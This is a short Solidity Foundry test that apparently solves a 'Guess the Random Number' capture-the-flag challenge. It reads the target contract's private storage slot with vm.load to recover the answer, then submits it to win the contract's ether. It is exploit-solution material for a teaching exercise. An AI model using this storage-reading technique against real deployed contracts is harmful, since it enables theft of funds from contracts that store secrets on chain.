// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/GuessRandomNumber.sol";

contract GuessRandomTest is Test {
    GuessTheRandomNumberChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheRandomNumberChallenge{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testIsComplete() public {
        uint8 answer = uint8(uint256(vm.load(address(target), 0)));
        vm.startPrank(player);
        target.guess{value: 1 ether}(answer);
        assertEq(target.isComplete(), true);
    }
}
